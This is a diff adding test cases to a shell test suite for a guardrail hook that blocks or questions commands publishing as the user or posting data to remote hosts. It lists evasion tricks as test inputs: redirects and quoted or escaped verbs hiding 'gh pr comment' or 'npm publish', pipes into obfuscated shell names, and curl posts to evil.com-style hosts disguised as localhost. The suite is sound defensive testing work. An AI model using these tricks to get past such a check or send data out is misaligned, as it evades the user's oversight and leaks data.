@@ -9,11 +9,17 @@ blocks() {
     echo "  FAIL [$2]: expected BLOCK, got allow — '$1'"; FAILS=1
   fi
 }
-# allows <cmdline> <label> — expects the command to pass through
+# allows <cmdline> <label> — expects the command to pass through, neither blocked nor asked about
 allows() {
-  if _guardrails_publishes_as_user "$1" >/dev/null; then
-    echo "  FAIL [$2]: expected ALLOW, got block — '$1'"; FAILS=1
-  fi
+  _guardrails_publishes_as_user "$1" >/dev/null
+  local rc=$?
+  [ "$rc" = 1 ] || { echo "  FAIL [$2]: expected ALLOW, got rc $rc — '$1'"; FAILS=1; }
+}
+# asks <cmdline> <label> — expects a question, rc 2: a verb read from one piece of a quoted argument
+asks() {
+  _guardrails_publishes_as_user "$1" >/dev/null
+  local rc=$?
+  [ "$rc" = 2 ] || { echo "  FAIL [$2]: expected ASK, got rc $rc — '$1'"; FAILS=1; }
 }
 
 # ---------------------------------------------------------------------------
@@ -471,5 +477,73 @@ allows 'curl -d x http://127.10.20.30/x'                                 "any do
 allows 'curl -d x "http://127.0.0.1"'                                    "a quoted loopback address, its quote read as the end"
 allows "curl -d x 'http://127.0.0.1'"                                    "a single-quoted loopback address"
 allows 'curl localhost'                                                  "a read from localhost"
+
+# A redirect or a quoted word between a command and its subcommand does not hide it (#131).
+blocks 'gh >out pr create --fill'                  "a fused redirect between gh and its subcommand"
+blocks 'gh pr 2> /dev/null create --title x'       "a separate redirect before create"
+blocks 'npm >a 2>b <c publish'                     "redirects do not count as words before a verb"
+blocks 'gh pr "comment" 1 -b x'                    "a quoted publish verb"
+blocks "gh 'pr' create --fill"                     "a quoted subcommand before create"
+blocks 'gh pr com\ment 1 -b x'                     "an escaped publish verb"
+allows 'gh >out pr create --draft --fill'          "a draft PR behind a redirect"
+allows 'gh pr view 1 > out'                        "a read with its output redirected"
+allows 'gh pr > comment view 1'                    "a redirect's target is not a verb"
+allows 'gh pr create --draft --fill'               "a draft PR with --fill"
+# The split drops a heredoc's delimiter, so the word after its << is not the delimiter.
+blocks $'gh pr <<EOF comment 1 -b x\nbody\nEOF'     "a heredoc opened before a publish verb"
+blocks 'gh pr << 2 comment 1 -b x'                 "a numeric heredoc delimiter, which the split keeps"
+blocks $'gh pr 10<<EOF comment 1 -b x\nbody\nEOF'   "a heredoc on a two-digit fd before a publish verb"
+blocks 'npm "-w" app publish'                      "a quoted word that looks like an option, as before"
+blocks 'gh pr <<< body comment 1 -b x'             "a here-string's word is not a verb"
+per_line_blocks() { _GUARDRAILS_SPLIT_PER_LINE=1 _guardrails_publishes_as_user "$1" >/dev/null || { echo "  FAIL [$2]: expected BLOCK"; FAILS=1; }; }
+per_line_blocks 'gh pr <<<x comment 1 -b x'        "the per-line split drops a here-string's word too"
+
+# A shell's name with quotes or backslashes inside it is still its name, so the pipe check reads it (#134).
+unseen 'cat x | b"as"h'                 "a pipe into a shell whose name holds quotes"
+unseen "cat x | k's'h -s"               "a pipe into a shell whose name holds single quotes"
+unseen 'cat x | b\ash'                  "a pipe into a shell whose name holds a backslash"
+unseen $'cat x | b\\\nash'              "a pipe into a shell whose name a backslash-newline splits"
+unseen $'true; cat x | b"as"h'          "a pipe into a quoted shell after another command"
+unseen "bash -c 'cat x | b\"as\"h'"     "a pipe into a quoted shell inside a payload"
+seen   'echo b"as"h'                    "a shell's quoted name as an argument"
+seen   'cat x | grep b"as"h'            "a shell's quoted name as a grep pattern"
+
+# A quote that closes a URL is not part of its host, for every host form (#135).
+allows 'curl -d x "http://localhost"'              "a quoted localhost URL with no path"
+allows "curl -d x 'http://localhost'"              "a single-quoted localhost URL with no path"
+allows 'curl -d x "http://localhost:3000/api"'     "a quoted localhost URL with a port and a path"
+allows 'curl -d x "http://localhost"/api'          "a localhost URL whose quote closes before its path"
+allows 'curl -d x "http://localhost.evil.com".local' "a host the shell joins into a .local name"
+blocks 'curl -d x "http://example.com"'            "a quoted remote URL with no path"
+blocks 'curl -d x "http://localhost.evil.com"'     "a quoted remote name that starts with localhost"
+blocks 'curl -d x "http://localhost"evil.com'      "a host the shell joins past a quote"
+blocks "curl -d x \"http://localhost\"'.evil.com'" "a host the shell joins from two quoted parts"
+blocks 'curl -d x "http://127.0.0.1"evil.com'      "a loopback address the shell joins into a remote name"
+allows 'curl -d x "http://localhost":8080/x'       "a quote that closes before the port"
+allows 'curl -d x "http://127.0.0.1":8080/x'       "a quote that closes a loopback address before the port"
+blocks 'curl -d x "http://localhost":3000@evil.com' "a user before an @ is not the host"
+blocks 'curl -d x "http://127.0.0.1":3000@evil.com' "a loopback user before an @ is not the host"
+
+# A verb read from one piece of a quoted argument of several words asks, as the shell passes the argument whole. One
+# read from a whole quoted word blocks, as does one in the middle of a quoted argument, as before (#131).
+asks   'claude "review this"'                       "a verb from the first piece of a quoted argument"
+asks   'python3 x.py "post this"'                   "a verb from the first piece, after a script"
+asks   "ssh host 'npm publish'"                     "a verb from the last piece of a quoted argument"
+asks   'gh "pr create" --fill'                      "a ready PR read from pieces of a quoted argument"
+asks   'x comment\ it'                              "a verb from a word an escaped blank joins to the next"
+asks   "bash -c 'claude \"review this\"'"           "a verb from a piece of a quoted argument in a payload"
+blocks 'python3 x.py "a post here"'                 "a verb in the middle of a quoted argument, as before"
+blocks 'x "post this" comment'                      "a whole verb after the pieces of a quoted argument"
+blocks 'gh pr co"mm"ent 1 -b x'                     "a word quoted in its middle is whole"
+blocks "gh pr 'comment' 1 -b x"                     "a single-quoted verb is whole"
+blocks 'claude "review this" && gh pr comment 1 -b x' "a question about one command hides no publish after it"
+blocks "bash -c 'claude \"review this\"'; npm publish" "a question inside a payload hides no publish after it"
+allows 'git commit -m "post the review"'            "a commit message naming verbs"
+per_line_asks() {
+  _GUARDRAILS_SPLIT_PER_LINE=1 _guardrails_publishes_as_user "$1" >/dev/null
+  local rc=$?
+  [ "$rc" = 2 ] || { echo "  FAIL [$2]: expected ASK, got rc $rc"; FAILS=1; }
+}
+per_line_asks $'git commit -m "Fix it\nsee the review"' "the per-line split cuts a quoted line into pieces too"
 
 finish "publish-cmd"
